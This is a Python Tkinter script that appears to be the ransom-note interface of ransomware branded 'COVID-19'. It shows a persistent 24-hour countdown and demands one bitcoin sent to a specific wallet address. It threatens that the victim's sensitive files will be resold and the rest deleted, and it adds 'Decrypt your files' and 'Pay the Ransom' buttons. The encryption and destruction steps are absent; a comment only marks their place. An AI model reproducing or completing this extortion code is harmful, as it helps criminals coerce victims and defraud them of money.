#!/usr/bin/python
#coding:utf-8
from tkinter import *
from PIL import ImageTk, Image
from timeit import default_timer
import tkinter as tk
import os, time, sys, timeps

window = Tk()
# Function to set a time on the window
def updateTime(generator):
    global p
    p = next(generator)
    canvas.itemconfigure(text_clock, text=p, font=(None, 35))
    window.after(1000, updateTime, generator)
    with open("\\PerfLogs\\gui_counter\\db.txt", "w") as db:
        db.write(p)
    x = open("\\PerfLogs\\gui_counter\\db.txt").read()
    if(x == "00:00:00"):
        # Here instruction to destroyed the system ...
        sys.exit(0)

def instructions():
    txt = tk.Label(font="bold", text="\nYour computer it's locked by the Ransomware COVID-19\n\n \
    For unlock to computer,\n \
    You have 24 HOURS to buy 1 bitcoin and transfert it at this address :\n\n \
    34YVap4JyjiBTWvy6Qobmni1k3tHbdi8UEL")
    txt.pack()

def warning():
    wrn = tk.Label(font="bold", text="Warning !\n \
    Restarting is useless\n\n \
    If you don't pay, all your sensitive files will be resold and the rest deleted.\n")
    wrn.pack()

def pay_to_decrypt():
    btn1 = tk.Button(window, text="Decrypt your files", font="bold", fg="red", bg="black")
    btn1.pack(side=tk.BOTTOM)
    btn2 = tk.Button(window, text="Pay the Ransom", font="bold", fg="red", bg="black")
    btn2.pack(side=tk.BOTTOM)

window.title("[$] Payment Instructions - Ransomware COVID19")
#window.attributes('-disabled', True)
canvas = Canvas(window, width=200, height=100, bg="red")
canvas.pack()
text_clock = canvas.create_text(100, 50)
# Function to control if db.txt exist
try:
    with open("\\PerfLogs\\gui_counter\\db.txt", "r") as db:
        db = db.read()
        db = db.split(":")
        hours = int(db[0])
        minutes = int(db[1])
        secondes = int(db[2])
        updateTime(timeps.set_time(hours, minutes, secondes))

except FileNotFoundError:
    with open("\\PerfLogs\\gui_counter\\db.txt", "w") as db:
        updateTime(timeps.set_time(24, 0, 0))

b = os.environ['SystemDrive']
a = "\\PerfLogs\\gui_counter\\image.jpg"
z = "%s%s" %(b, a)
# Set image in the window
img = ImageTk.PhotoImage(Image.open(z))
panel = tk.Label(window, image = img)
panel.pack(side = "top", fill = "both", expand = "yes")
# Instructions message for the user
instructions()
warning()
pay_to_decrypt()
window.mainloop()
